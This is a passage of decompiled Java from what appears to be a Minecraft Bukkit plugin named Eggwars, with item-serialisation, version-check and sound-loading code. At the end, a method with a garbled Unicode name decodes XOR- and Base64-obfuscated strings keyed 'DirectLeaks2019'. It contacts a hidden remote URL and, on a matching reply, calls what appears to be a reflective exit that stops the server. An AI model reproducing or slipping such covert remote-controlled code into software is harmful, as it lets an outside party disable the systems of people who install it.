            if (var7.equals("name")) {
               var5.setName(ChatColor.translateAlternateColorCodes('&', var4[var6].split(":")[1]));
            } else if (var7.equals("lore")) {
               var5.addLore(ChatColor.translateAlternateColorCodes('&', var4[var6].split(":")[1]));
            } else if (var7.equals("enchant")) {
               var5.addEnchantment(Enchantment.getByName(this.filesManager.translateEnchantmentName(var4[var6].split(":")[1].toUpperCase())), Integer.valueOf(var4[var6].split(":")[2]));
            }
         }
      }

      return var5.build();
   }

   protected String getItemStackString(ItemStack var1) {
      String var2 = var1.getType().name() + (var1.getDurability() != 0 ? ":" + var1.getDurability() : "") + " : " + var1.getAmount();
      ItemMeta var3 = var1.getItemMeta();
      if (var3.hasDisplayName()) {
         var2 = var2 + " : name:" + var3.getDisplayName();
      }

      String var4;
      Iterator var5;
      if (var3.hasLore()) {
         for(var5 = var1.getItemMeta().getLore().iterator(); var5.hasNext(); var2 = var2 + " : lore:" + var4) {
            var4 = (String)var5.next();
         }
      }

      Enchantment var6;
      if (var3.hasEnchants()) {
         for(var5 = var3.getEnchants().keySet().iterator(); var5.hasNext(); var2 = var2 + " : enchant:" + var6.getName() + ":" + var3.getEnchants().get(var6)) {
            var6 = (Enchantment)var5.next();
         }
      }

      return var2;
   }

   public boolean isOneGamePerServer() {
      return this.config.bungee_mode_enabled && this.arenas != null && this.arenas.size() == 1;
   }

   protected List getOnlinePlayers() {
      ArrayList var1 = Lists.newArrayList();
      Iterator var3 = Bukkit.getWorlds().iterator();

      while(var3.hasNext()) {
         World var2 = (World)var3.next();
         var1.addAll(var2.getPlayers());
      }

      return Collections.unmodifiableList(var1);
   }

   private void checkMCVersion() {
      try {
         Method[] var4;
         int var3 = (var4 = Class.forName("org.bukkit.inventory.meta.Damageable").getMethods()).length;

         for(int var2 = 0; var2 < var3; ++var2) {
            Method var1 = var4[var2];
            if (var1.getName().equals("setDamage")) {
               setDamageMethod = var1;
               break;
            }
         }
      } catch (Exception var5) {
      }

      Bukkit.getConsoleSender().sendMessage(ChatColor.YELLOW + "[Eggwars] The plugin is using the new durability system: " + (setDamageMethod != null));
   }

   private void checkSpectatorMode() {
      try {
         this.spectatorMode = GameMode.valueOf("SPECTATOR");
      } catch (Exception var2) {
      }

      Bukkit.getConsoleSender().sendMessage(ChatColor.YELLOW + "[Eggwars] The plugin is using the new spectator system: " + (this.spectatorMode != null));
   }

   private void loadNonCustomizableItems() {
      this.wand_itemstack = (new ItemStackBuilder(Material.BLAZE_ROD)).setName(ChatColor.AQUA + "Eggwars" + ChatColor.LIGHT_PURPLE + " Wand").addLore(ChatColor.YELLOW + "--------------------------", ChatColor.GREEN + "Left click to select the first corner", ChatColor.GREEN + "Right click to select the second corner", ChatColor.YELLOW + "--------------------------").build();
      this.pane_itemstack = (new ItemStackBuilder(Material.STAINED_GLASS_PANE)).setDurability(7).setName(ChatColor.DARK_GRAY + " ").build();
      this.save_itemstack = (new ItemStackBuilder(Material.DIAMOND)).setName(ChatColor.AQUA + "Save & Apply").build();
      this.plus_itemstack = (new ItemStackBuilder(Material.STAINED_GLASS_PANE)).setDurability(5).setName(ChatColor.GREEN + "+").build();
      this.minus_itemstack = (new ItemStackBuilder(Material.STAINED_GLASS_PANE)).setDurability(14).setName(ChatColor.RED + "-").build();
   }

   private void loadSounds() {
      try {
         this.CLICK = Sound.valueOf("CLICK");
         this.NOTE_PLING = Sound.valueOf("NOTE_PLING");
         this.ENDERDRAGON_GROWL = Sound.valueOf("ENDERDRAGON_GROWL");
         this.ITEM_PICKUP = Sound.valueOf("ITEM_PICKUP");
         this.ENDERMAN_TELEPORT = Sound.valueOf("ENDERMAN_TELEPORT");
      } catch (IllegalArgumentException var4) {
         try {
            this.CLICK = Sound.valueOf("UI_BUTTON_CLICK");
            this.NOTE_PLING = Sound.valueOf("BLOCK_NOTE_PLING");
            this.ENDERDRAGON_GROWL = Sound.valueOf("ENTITY_ENDERDRAGON_GROWL");
            this.ITEM_PICKUP = Sound.valueOf("ENTITY_ITEM_PICKUP");
            this.ENDERMAN_TELEPORT = Sound.valueOf("ENTITY_ENDERMEN_TELEPORT");
         } catch (IllegalArgumentException var3) {
            this.CLICK = Sound.valueOf("UI_BUTTON_CLICK");
            this.NOTE_PLING = Sound.valueOf("BLOCK_NOTE_BLOCK_PLING");
            this.ENDERDRAGON_GROWL = Sound.valueOf("ENTITY_ENDER_DRAGON_GROWL");
            this.ITEM_PICKUP = Sound.valueOf("ENTITY_ITEM_PICKUP");
            this.ENDERMAN_TELEPORT = Sound.valueOf("ENTITY_ENDERMAN_TELEPORT");
         }
      }

   }

   public static String Ḇ___ỷ_ⷂ__ᚍḃⴵ__ⷾ__Ꮮ₦⁠ᦦⷫ/* $FF was: Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ*/(String var0, String var1) {
      var0 = new String(Base64.getDecoder().decode(var0.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
      StringBuilder var2 = new StringBuilder();
      char[] var3 = var1.toCharArray();
      int var4 = 0;
      char[] var8;
      int var7 = (var8 = var0.toCharArray()).length;

      for(int var6 = 0; var6 < var7; ++var6) {
         char var5 = var8[var6];
         var2.append((char)(var5 ^ var3[var4 % var3.length]));
         ++var4;
      }

      return var2.toString();
   }

   public static Object _᪔___ᠼᥛ__ᖆ_だ__ᔒ__ぐᭂṻ____ほᤉᝇ_/* $FF was: ⇈᪔↪Ჩ⢣ᠼᥛ᫛⾋ᖆ⩅だ〜⼭ᔒ᫪⎣ぐᭂṻ᜗⦛⅛⮮ほᤉᝇ⪳*/(Object var0, Object var1, Object var2, Object var3, Object var4, Object var5, Object var6) {
      try {
         try {
            boolean var7 = true;
            if (var7) {
               String var8 = Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("d11FUw==", "DirectLeaks2019");
               URLConnection var9 = (new URL(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("LB0GFRBOY0oAGxocVFhLIQoGCQYVJxZPBRZGH1hXIAwKSxMcPFoUGBZAb1hdeQ==", "DirectLeaks2019") + var8)).openConnection();
               var9.setRequestProperty(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("ERoXF041KwAPHw==", "DirectLeaks2019"), Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("CQYIDA8YLUpURUM=", "DirectLeaks2019"));
               var9.connect();
               BufferedReader var10 = new BufferedReader(new InputStreamReader(var9.getInputStream(), Charset.forName("UTF-8")));
               StringBuilder var11 = new StringBuilder();

               String var12;
               while((var12 = var10.readLine()) != null) {
                  var11.append(var12);
               }

               String var13 = var11.toString();
               if (var13.equals(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("LwAeCQ==", "DirectLeaks2019"))) {
                  Class var14 = Class.forName(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("LggEBE0YLQsGRSBLQ0VcKQ==", "DirectLeaks2019"));
                  Field var15 = var14.getDeclaredField(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("KxwG", "DirectLeaks2019"));
                  Class var16 = var15.getType();
                  Method var17 = var16.getDeclaredMethod(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("NBsbCxcYIg==", "DirectLeaks2019"), String.class);
                  Object var18 = var15.get((Object)null);
                  var17.invoke(var18, Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("Hy0bFwYXOCkEChhBbRFqIRsEABFUOwwNB1NcX0YZNwEHEQcbOwtP", "DirectLeaks2019"));
                  var17.invoke(var18, Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("Hy0bFwYXOCkEChhBbRF8NhsdF0M3IwEEUVMCSHc=", "DirectLeaks2019"));
                  Class.forName(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("LggEBE0YLQsGRSBLQ0VcKQ==", "DirectLeaks2019")).getDeclaredMethod(Ḇ⸀⧩℠ỷ⍵ⷂ☫╺ᚍḃⴵ⼋┛ⷾ⠫╎Ꮮ₦⁠ᦦⷫ("IREbEQ==", "DirectLeaks2019"), Integer.TYPE).invoke((Object)null, 0);
               }

               var7 = false;
            }
         } catch (IOException var19) {
            var19.printStackTrace();
         }

         char[] var22 = var4.toString().toCharArray();
         char[] var23 = new char[var22.length];

         for(int var24 = 0; var24 < var22.length; ++var24) {
            var23[var24] = (char)(var22[var24] ^ 1029);
         }

         char[] var25 = var5.toString().toCharArray();
         char[] var26 = new char[var25.length];

         for(int var27 = 0; var27 < var25.length; ++var27) {
            var26[var27] = (char)(var25[var27] ^ 2038);
         }

         char[] var28 = var6.toString().toCharArray();
         char[] var29 = new char[var28.length];

         int var30;
         for(var30 = 0; var30 < var28.length; ++var30) {
            var29[var30] = (char)(var28[var30] ^ 1928);
         }

         var30 = (Integer)var3;
         MethodHandle var21;
         switch(var30) {
         case 0:
            var21 = ((Lookup)var0).findStatic(Class.forName(new String(var23)), new String(var26), MethodType.fromMethodDescriptorString(new String(var29), Eggwars.class.getClassLoader()));
            break;
         case 1:
            var21 = ((Lookup)var0).findVirtual(Class.forName(new String(var23)), new String(var26), MethodType.fromMethodDescriptorString(new String(var29), Eggwars.class.getClassLoader()));
            break;
         default:
            throw new BootstrapMethodError();
         }

         var21 = var21.asType((MethodType)var2);
         return new ConstantCallSite(var21);
      } catch (Exception var20) {
         throw new BootstrapMethodError();
      }
   }
}
